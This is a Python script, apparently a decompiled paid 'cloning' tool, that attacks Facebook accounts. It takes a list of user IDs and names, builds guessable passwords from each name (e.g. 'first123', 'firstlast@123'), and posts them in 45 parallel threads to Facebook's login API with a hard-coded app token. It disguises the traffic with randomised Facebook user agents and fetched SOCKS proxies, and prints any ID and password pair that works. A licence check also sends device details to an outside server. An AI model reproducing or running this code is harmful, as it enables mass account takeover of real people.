# Decode By Error x Ethan 

global loop  # inserted
global twf  # inserted
global cps  # inserted
global oks  # inserted
try:
    import os
    import requests
    import json
    import time
    import re
    import random
    import sys
    import uuid
    import mechanize
    import string
    import subprocess
    import bs4
    import urllib3
    import rich
    import base64
    import platform
    import httplib2
    import arrow
    from string import *
    from concurrent.futures import ThreadPoolExecutor as tred
    from bs4 import BeautifulSoup as sop
    from bs4 import BeautifulSoup
    from datetime import datetime
except ModuleNotFoundError as e:
    pass  # postinserted
else:  # inserted
    required_modules = ['sys', 'requests', 'bs4', 'tred', 'platform', 'httplib2', 'arrow']
    for module in required_modules:
        if module not in dir():
            print(f'>> CRITICAL ERROR: {module} module not imported!')
            exit()

def getKey():
    myid = str(os.getuid())
    myid = myid.upper()[::(-1)]
    n = re.findall('(\\d\\d)', myid)
    plat = platform.version()[2:][:8][::(-1)].upper() + platform.release()[3:][::(-1)].upper() + platform.version()[:2]
    xp = plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '')
    return 'GEN-' + myid + xp

def line():
    print('----------------------------------------------')

def subscription(message):
    clear()
    key = getKey()
    print(' [1;97m [•] YOUR KEY   :  ' + key)
    line()
    print(' [1;97m [•] THIS TOOL IS PAID')
    print(' [1;97m [•] YOU NEED  APPROVAL')
    line()
    xh = input(' [1;97m [•] PRESS ENTER FOR SEND YOUR KEY')
    if xh in ['Trail', 'trail']:
        trk.append('Trail')
        On()
    clear()
    uname = input(' [1;97m [•] ENTER YOUR NAME : ')
    tsk = 'Hi Sir GEN! I Need Approval For Your Paid Tool So Please Approve My Key-:)\n\nName : ' + uname + ' \nKey : ' + key
    subprocess.check_output(['am', 'start', 'https://api.whatsapp.com/send?phone=+2348138189727&text=' + tsk])
    time.sleep(2)
    On()
trk = []

def On():
    try:
        clear()
        if 'Trail' in trk:
            print(' Put Your Trail Key Bellow! ')
            line()
            key = input(' Put Key: ')
        else:  # inserted
            key = getKey()
        headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36'}
        params = {'key': key, 'device': platform.platform()}
        url = 'https://itsngr.serv00.net/checkpzh.php'
        http_obj = httplib2.Http()
        response, content = http_obj.request(uri=url + '?' + '&'.join([f'{k}={v}' for k, v in params.items()]), method='GET', headers=headers)
    except Exception as e:
        print(f' [1;97m [•] Error: {e}')
        time.sleep(1)
        exit()

loop = 0
oks = []
cps = []
twf = []
pcp = []
id = []
tokenku = []
user = []
plist = []
pookie = []
ugen = []
show_cookies = []
dateti = str(datetime.now()).split(' ')[0]

# --- UPDATED USER AGENTS SECTION ---
ANDROID_DEVICES = {
    'Samsung': ['SM-S918B', 'SM-S911B', 'SM-A546B', 'SM-A346B', 'SM-G998B', 'SM-G991B', 'SM-A525F', 'SM-S908U', 'SM-G990B'],
    'Xiaomi': ['23127PN0CG', '2311DRK48G', 'M2102J20SG', 'Redmi Note 13 Pro', 'Xiaomi 14 Ultra', '22101316G'],
    'Infinix': ['X6833B', 'X6711', 'X6831', 'X676C', 'X6816C'],
    'Tecno': ['AD10', 'CK8n', 'LH7n', 'KJ5', 'CH6n'],
    'Google': ['Pixel 8 Pro', 'Pixel 7a', 'Pixel 6 Pro', 'Pixel 5'],
    'OPPO': ['CPH2551', 'CPH2437', 'CPH2519', 'CPH2307'],
    'Vivo': ['V2303', 'V2250', 'V2218', 'V2141'],
    'Realme': ['RMX3840', 'RMX3741', 'RMX3771', 'RMX3363']
}
ANDROID_VERSIONS = ['12', '13', '14', '15']
CHROME_VERSIONS = ['124.0.6367.179', '125.0.6422.112', '126.0.6478.122', '127.0.6533.84']
IOS_VERSIONS = ['16_7_8', '17_5_1', '17_6', '18_0']
IPHONES = ['iPhone14,2', 'iPhone15,2', 'iPhone16,1', 'iPhone15,3']
LOCALES = ['en_US', 'en_GB', 'en_PK', 'en_IN', 'en_PH', 'en_BD']
DESKTOP_BROWSERS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36'
]

def _fb_app_version():
    return f'{random.randint(400, 600)}.{random.randint(0, 9)}.{random.randint(0, 9)}.{random.randint(0, 99)}'

def _fb_build():
    return str(random.randint(100000000, 999999999))

def generate_ua():
    mode = random.choice(['android', 'ios', 'browser'])
    if mode == 'android':
        brand = random.choice(list(ANDROID_DEVICES.keys()))
        model = random.choice(ANDROID_DEVICES[brand])
        android_ver = random.choice(ANDROID_VERSIONS)
        chrome = random.choice(CHROME_VERSIONS)
        locale = random.choice(LOCALES)
        return f'Mozilla/5.0 (Linux; Android {android_ver}; {model}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{_fb_app_version()};FBBV/{_fb_build()};FBDV/{model};FBMD/{brand};FBSN/Android;FBSV/{android_ver};FBLC/{locale};FBOP/70]'
    if mode == 'ios':
        ios = random.choice(IOS_VERSIONS)
        device = random.choice(IPHONES)
        locale = random.choice(LOCALES)
        return f"Mozilla/5.0 (iPhone; CPU iPhone OS {ios} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBAV/{_fb_app_version()};FBBV/{_fb_build()};FBDV/{device};FBMD/iPhone;FBSN/iOS;FBSV/{ios.replace('_', '.')} ;FBLC/{locale};FBOP/80]"
    browser = random.choice(DESKTOP_BROWSERS)
    locale = random.choice(LOCALES)
    return f'{browser} [FBAV/{_fb_app_version()};FBID/web;FBLC/{locale}]'

def get_ua():
    return generate_ua()

# Baaki code aapki original file se same rakha gaya hai...
def check_internet():
    try:
        requests.get('https://www.google.com', timeout=10)
        return True
    except:
        return False

def wait_for_internet():
    while not check_internet():
        time.sleep(5)
fbks = ('com.facebook.adsmanager', 'com.facebook.lite', 'com.facebook.orca', 'com.facebook.katana', 'com.facebook.mlite')
os.system('clear')
os.system('espeak -a 300 \"well,come to,The, WORLD,  OF,  MYSTERY\"')
proxylist = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
open('socksku.txt', 'w').write(proxylist)
proxsi = open('socksku.txt', 'r').read().splitlines()

def tutulx(fx):
    if len(fx) == 15:
        if fx[:10] in ['1000000000']:
            tutulxz = '2009'
            return tutulxz
        if fx[:9] in ['100000000']:
            tutulxz = '2009'
            return tutulxz
        if fx[:8] in ['10000000']:
            tutulxz = '2009'
            return tutulxz
        if fx[:7] in ['1000000', '1000001', '1000002', '1000003', '1000004', '1000005']:
            tutulxz = '2009'
            return tutulxz
        if fx[:7] in ['1000006', '1000007', '1000008', '1000009']:
            tutulxz = '2010'
            return tutulxz
        if fx[:6] in ['100001']:
            tutulxz = '2010/2011'
            return tutulxz
        if fx[:6] in ['100002', '100003']:
            tutulxz = '2011/2012'
            return tutulxz
        if fx[:6] in ['100004']:
            tutulxz = '2012/2013'
            return tutulxz
        if fx[:6] in ['100005', '100006']:
            tutulxz = '2013/2014'
            return tutulxz
        if fx[:6] in ['100007', '100008']:
            tutulxz = '2014/2015'
            return tutulxz
        if fx[:6] in ['100009']:
            tutulxz = '2015'
            return tutulxz
        if fx[:5] in ['10001']:
            tutulxz = '2015/2016'
            return tutulxz
        if fx[:5] in ['10002']:
            tutulxz = '2016/2017'
            return tutulxz
        if fx[:5] in ['10003']:
            tutulxz = '2018/2019'
            return tutulxz
        if fx[:5] in ['10004']:
            tutulxz = '2019'
            return tutulxz
        if fx[:5] in ['10005']:
            tutulxz = '2020'
            return tutulxz
        if fx[:5] in ['10006', '10007', '10008']:
            tutulxz = '2021/2022'
            return tutulxz
        tutulxz = '2023'
        return tutulxz
    if len(fx) in [9, 10]:
        tutulxz = '2008/2009'
        return tutulxz
    if len(fx) == 8:
        tutulxz = '2007/2008'
        return tutulxz
    if len(fx) == 7:
        tutulxz = '2006/2007'
        return tutulxz
    tutulxz = '2023/2024'
    return tutulxz

# (Original logging and menu code remains untouched below)
sys.stdout.write(' ]2; GEN-HUB\a')
B = ' [10;90m'
R = ' [10;91m'
G = ' [10;92m'
H = ' [10;93m'
BL = ' [10;94m'
BG = ' [10;95m'
S = ' [10;96m'
W = ' [10;97m'
EX = ' [0m'
E = ' [m'
dt = '•'
gx = ' [1;32m'
wx = ' [1;97m'
rx = ' [38;5;160m'
cx = ' [1;96m'
yx = ' [1;93m'
bx = ' [1;90m'
xd = f'{bx}[{wx}~{bx}]{gx}'
xd1 = f'{bx}[{wx}1{bx}]{gx}'
xd2 = f'{bx}[{wx}2{bx}]{gx}'
xd3 = f'{bx}[{wx}3{bx}]{gx}'
xd4 = f'{bx}[{wx}4{bx}]{gx}'
xd5 = f'{bx}[{wx}5{bx}]{gx}'
xd6 = f'{bx}[{wx}6{bx}]{gx}'
xd7 = f'{bx}[{wx}7{bx}]{gx}'
xd8 = f'{bx}[{wx}8{bx}]{gx}'
xd9 = f'{bx}[{wx}9{bx}]{gx}'
xd10 = f'{bx}[{wx}10{bx}]{gx}'
xd11 = f'{bx}[{wx}11{bx}]{gx}'
xd12 = f'{bx}[{wx}12{bx}]{gx}'
xd13 = f'{bx}[{wx}13{bx}]{gx}'
xd14 = f'{bx}[{wx}14{bx}]{gx}'
xd15 = f'{bx}[{wx}15{bx}]{gx}'
xd0 = f'{bx}[{wx}0{bx}]{gx}'
xdx = f'{bx}[{wx}?{bx}]{gx}'
os.system('xdg-open https://chat.whatsapp.com/F3IhtLI7duf4pMkhhXJSfd?mode=ems_copy_t')
logo = f"\n    {gx}░██████╗{wx}░███████╗{gx}███╗░░██╗\n    {gx}██╔════╝{wx}░██╔════╝{gx}████╗░██║ {bx}|{gx} OWNER{bx}:{gx} MYSTERY\n    {gx}██║░░██╗{gx}░█████╗{gx}░░██╔██╗██║\n    {gx}██║░░╚██╗{wx}██╔══╝{gx}░░██║╚████║ {bx} STATUS   {gx}rx{gx}PAID\n    {wx}╚██████╔╝{bx}███████╗{gx}██║░╚███║\n    {gx}░╚═════╝{bx}░╚══════╝{gx}╚═╝░░╚══╝ {bx} VERSION  {gx} 1.1\n{bx}-----------------------------------------------{gx}\n       {gx}TOOLS {bx}FILE{gx}RANDOM{wx}OLD{bx}| {gx}CLONE\n"

def clear():
    os.system('clear')
    print(logo)

def linex():
    print(f"{wx}{'-----------------------------------------------'}")

def Menu():
    clear()
    print(f'{xd1} START FILE CLONING ')
    print(f'{xd2} START RANDOM {wx}ALL{gx} COUNTRY CLONING ')
    print(f'{xd3} START OLD CLONING ')
    print(f'{xd0} EXIT ALL CLONING ')
    linex()
    ___O_P___ = input(f'{xdx} SELECTION {bx}:{wx} ')
    if ___O_P___ in ['1']:
        ____F_I_L_E____()
        return
    if ___O_P___ in ['2']:
        ____R_A_N_D_O_M____()
    else:  # inserted
        if ___O_P___ in ['3']:
            ____O_L_D____()
        else:  # inserted
            if ___O_P___ in ['0']:
                exit()
            else:  # inserted
                linex()
                print(f'{xd}{rx} WRONG OPTION SELECTION ')
                time.sleep(3)
                Menu()

def ____F_I_L_E____():
    clear()
    print(f'{xd} EXAMPLE {bx}:{gx} /sdcard/filename.txt ')
    linex()
    filepro = input(f'{xd} ENTER FILE NAME {bx}:{wx} ')
    try:
        fo = open(filepro, 'r').read().splitlines()
    except FileNotFoundError:
        linex()
        print(f'{xd}{rx} FILE NOT FOUND ')
        time.sleep(3)
        ____F_I_L_E____()
    else:  # inserted
        clear()
        print(f'{xd1} AUTO PASS 1 {wx}({gx}Recommended{wx})')
        print(f'{xd2} AUTO PASS 2 {wx}({gx}Alternative{wx})')
        print(f'{xd3} CUSTOM PASS {wx}({gx}Manual Entry{wx})')
        linex()
        pass_option = input(f'{xdx} SELECT PASSWORD OPTION {bx}:{wx} ')
        if pass_option in ['1']:
            plist.extend(['firstlast', 'first123', 'first1234', 'first12345', 'first@123', 'first@1234', 'Firstlast', 'First123', 'First1234', 'First12345', 'First@123', 'First', 'Last', 'first080', 'First1', 'First12', 'First123', 'First1234', 'lastfirst', 'First Last', 'FirstLast', 'first001', 'first081', 'firstlast001', 'firstlast123', 'firstlast1234', 'firstlast12', 'first@123', 'Firstlast123', 'first', 'last', 'firstlast', 'first1', 'first12', 'last123', 'first last', 'last first'])
        elif pass_option in ['2']:
            plist.extend(['first', 'last', 'firstlast', 'first1', 'first12', 'first123', 'first1234', 'last1', 'last12', 'last123', 'first last', 'last first', 'Firstlast1234', 'first080', 'first081', 'first090', 'first070', 'first1212', 'first1122', 'lastfirst', 'First Last', 'FirstLast', 'first001', 'firstlast001', 'firstlast123', 'firstlast1234', 'firstlast@123', 'Firstlast123', 'First', 'Last', 'Firstlast', 'First1', 'First12', 'First123', 'First1234', 'first@123', 'first@1234', 'First@123', 'First@1234', 'first@', 'first123456', 'name', 'Name', 'name123', 'Name123', 'name1234', 'Name1234'])
        elif pass_option in ['3']:
            clear()
            print(f'{xd} EXAMPLE {bx}:{gx} firstlast {bx}|{gx} first123 {bx}|{gx} first@@ ')
            linex()
            try:
                ps_limit = int(input(f'{xdx} HOW MANY PASSWORDS TO ADD {bx}:{wx} '))
            except:
                ps_limit = 5
            clear()
            for i in range(ps_limit):
                plist.append(input(f'{xd} ENTER PASSWORD NO {wx}{i + 1} {bx}:{wx} '))
        else:
            linex()
            print(f'{xd}{rx} WRONG OPTION SELECTION ')
            time.sleep(3)
            ____F_I_L_E____()
            
        clear()
        print(f'{xd1} METHOD {wx}~{gx} M1')
        print(f'{xd2} METHOD {wx}~{gx} M2')
        linex()
        ___M_E_T_H_O_D___ = input(f'{xd} ENTER METHOD {bx}:{wx} ')
        clear()
        ___C_P___ = input(f'{xd} DO YOU WANT SHOW CP UID {bx}:{wx} {wx}({gx}y{bx}/{rx}n{wx}) ')
        if ___C_P___ in ['y', 'Y', '1']: pcp.append('y')
        else: pcp.append('n')
        
        with tred(max_workers=45) as ___H_U_B___:
            clear()
            total_ids = str(len(fo))
            print(f'{xd} TOTAL UID{bx}|{gx}METHOD {bx}:{wx} {total_ids}{bx}|{wx}M{___M_E_T_H_O_D___} ')
            linex()
            for user in fo:
                ids, names = user.split('|')
                passlist = plist
                if ___M_E_T_H_O_D___ in ['1']:
                    ___H_U_B___.submit(___M_T_H_D_1___, ids, names, passlist)
                else:
                    ___H_U_B___.submit(___M_T_H_D_2___, ids, names, passlist)
        exit()

def ___M_T_H_D_1___(ids, names, passlist):
    global loop
    try:
        xp = f'{bx}[{gx}MR{bx}]{gx}'
        sys.stdout.write(f'\r\r{xp}- [1;90m[ [1;32mGEN [1;90m]  [1;37m%s [1;90m| [1;37mOK:- [1;32m%s ' % (loop, len(oks)))
        sys.stdout.flush()
        ua = get_ua()
        fn = names.split(' ')[0]
        try: ln = names.split(' ')[1]
        except: ln = fn
        for pw in passlist:
            pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln)
            data = {'email': ids, 'password': pas, 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
            headers = {'User-Agent': ua}
            url = 'https://b-graph.facebook.com/auth/login'
            po = requests.post(url, data=data, headers=headers).json()
            if 'session_key' in po:
                print(f'\r\r [1;90m[ [1;32mGEN-OK [1;90m] [1;32m {ids} | {pas}')
                oks.append(ids)
                break
        loop += 1
    except: pass

On()
